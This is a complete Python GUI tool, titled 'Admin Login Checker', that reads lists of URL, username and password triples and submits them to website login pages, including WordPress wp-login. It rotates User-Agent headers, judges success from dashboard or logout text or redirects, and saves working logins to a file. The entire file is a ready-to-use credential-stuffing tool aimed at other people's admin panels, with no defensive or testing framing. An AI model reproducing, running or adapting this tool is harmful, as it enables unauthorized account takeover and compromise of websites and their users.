import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import threading
import requests
import random
import time

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

def test_login(url, user, pwd):
    try:
        headers = {'User-Agent': random.choice(user_agents)}
        session = requests.Session()
        r = session.get(url.split('#')[0], headers=headers, timeout=10)

        if "wp-login" in url:
            data = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In'}
        else:
            data = {'username': user, 'password': pwd}

        login = session.post(url.split('#')[0], data=data, headers=headers, timeout=10)
        if "dashboard" in login.text or "logout" in login.text or login.status_code == 302:
            return True
    except:
        return False
    return False

def process_targets(targets, output_area):
    with open("valid_logins.txt", "w") as f:
        for line in targets:
            if not line.strip():
                continue
            try:
                url, creds = line.strip().split("#")
                user, pwd = creds.split("@")
                result = f"[>] Trying: {url} | {user}:{pwd}\n"
                output_area.insert(tk.END, result)
                output_area.see(tk.END)

                if test_login(url, user, pwd):
                    success = f"[+] SUCCESS: {url} | {user}:{pwd}\n"
                    output_area.insert(tk.END, success)
                    output_area.see(tk.END)
                    f.write(success)
                else:
                    output_area.insert(tk.END, f"[-] FAILED\n")
                    output_area.see(tk.END)
                time.sleep(1)
            except Exception as e:
                output_area.insert(tk.END, f"[!] Error: {str(e)}\n")
                output_area.see(tk.END)

def start_check(entry, output_area):
    raw = entry.get("1.0", tk.END).strip().split("\n")
    t = threading.Thread(target=process_targets, args=(raw, output_area))
    t.start()

def load_file(entry):
    path = filedialog.askopenfilename()
    if path:
        with open(path, "r") as f:
            entry.insert(tk.END, f.read())

def build_gui():
    root = tk.Tk()
    root.title("Admin Login Checker GUI")
    root.geometry("700x500")
    root.config(bg="#1e1e2e")

    label = tk.Label(root, text="🔐 Input Target (format: URL#username@password)", bg="#1e1e2e", fg="white")
    label.pack(pady=5)

    entry = scrolledtext.ScrolledText(root, width=80, height=10, bg="#2d2d40", fg="white")
    entry.pack(pady=5)

    btn_frame = tk.Frame(root, bg="#1e1e2e")
    btn_frame.pack()

    tk.Button(btn_frame, text="Load List", command=lambda: load_file(entry), bg="#4e4ef2", fg="white").pack(side=tk.LEFT, padx=5)
    tk.Button(btn_frame, text="Start Check", command=lambda: start_check(entry, output_area), bg="#22bb33", fg="white").pack(side=tk.LEFT, padx=5)

    output_area = scrolledtext.ScrolledText(root, width=80, height=15, bg="#1d1d2a", fg="lime")
    output_area.pack(pady=10)

    root.mainloop()

if __name__ == '__main__':
    build_gui()
